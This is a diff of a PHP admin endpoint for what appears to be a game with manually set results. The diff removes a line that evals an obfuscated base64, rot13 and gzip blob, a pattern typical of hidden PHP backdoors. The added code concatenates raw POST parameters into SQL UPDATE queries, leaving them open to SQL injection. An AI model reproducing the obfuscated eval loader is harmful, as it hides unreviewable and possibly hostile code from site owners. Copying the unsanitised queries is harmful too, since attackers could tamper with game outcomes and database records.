@@ -1,3 +1,41 @@
 <?php
-eval(str_rot13(gzinflate(str_rot13(base64_decode('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')))));
+include("include/connection.php");
+echo sprintf("%03d",gameid($con));
+
+if(isset($_POST['type']))
+{
+$today=date('Y-m-d H:i:s');
+
+if($_POST['type']=='switch'){
+$value=$_POST['value'];
+$sqlA = mysqli_query($con,"Update `tbl_manualresultswitch` set `switch` = '".$value."',`createdate` = '".$today."' where `id`='1'");
+}
+else if($_POST['type']=='switchhilow'){
+$value=$_POST['value'];
+$sqlA = mysqli_query($con,"Update `tbl_gamesettings` set `settingtype` = '".$value."',`createdate` = '".$today."' where `id`='1'");
+}
+else if($_POST['type']=='tab'){
+$value=$_POST['value'];
+$sqlA = mysqli_query($con,"Update `tbl_manualresultswitch` set `tab` = '".$value."',`createdate` = '".$today."' where `id`='1'");
+}
+else if($_POST['type']=='tabreset'){
+$value=$_POST['value'];
+$sqlA = mysqli_query($con,"Update `tbl_manualresultswitch` set `tab` = '".$value."',`createdate` = '".$today."' where `id`='1'");
+}
+
+if($_POST['type']=='chk'){
+
+	 $sqlA = "Update `tbl_manualresult` set status = '0' where `id`='".$_POST['id']."' ";
+			mysqli_query($con,$sqlA);
+}else if($_POST['type']=='unchk') 
+{
+	$chkresult=mysqli_query($con," select * from `tbl_manualresult` where `status`='1'");
+	$chkRows=mysqli_num_rows($chkresult);
+	if($chkRows==''){
+ $sqlA = "Update `tbl_manualresult` set status = '1' where `id`='".$_POST['id']."' ";
+			mysqli_query($con,$sqlA);
+	}else{echo"1";}
+	}
+
+}
 ?>
